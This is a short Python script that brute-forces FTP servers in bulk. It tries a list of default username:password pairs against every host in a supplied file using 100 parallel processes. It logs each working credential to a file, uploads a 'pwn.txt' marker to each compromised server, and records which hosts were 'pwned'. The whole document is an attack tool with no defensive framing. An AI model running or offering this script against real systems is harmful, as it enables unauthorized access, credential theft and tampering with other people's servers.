import ftplib
import multiprocessing as mp

ftpList = open('ftp-betterdefaultpasslist.txt', 'r').read().splitlines()

def loginFtp(hostname):
    if '://' in hostname:
        hostname = hostname.split('/')[2]
    elif hostname.endswith('/'):
        hostname = hostname[:-1]
    else:
        pass
    for ftp in ftpList:
        username, password = ftp.split(':')
        try:
            ftpConn = ftplib.FTP(hostname)
            ftpConn.login(username, password)
            ftpFormat = 'ftp://{}:{}@{}:21'.format(username, password, hostname)
            print('[+] Login Success: ' + hostname + ' ' + username + ' ' + password)
            with open('ftp-creds.txt', 'a') as f:
                f.write(ftpFormat + '\n')
            fileName = "pwn.txt"
            ftpConn.storbinary('STOR ' + fileName, open(fileName, 'rb'))
            with open('ftp-pwned.txt', 'a') as f:
                f.write(ftpFormat + '\n')
            ftpConn.quit()
            break
        except ftplib.all_errors as e:
            print('[-] Login Failed: ' + hostname + ' ' + username + ' ' + password, end='\r')
    print()
            
def main():
    lists_url = open(input('Enter the file name: '), 'r').read().splitlines()
    pool = mp.Pool(100)
    pool.map(loginFtp, lists_url)
    pool.close()
    pool.join()

if __name__ == '__main__':
    main()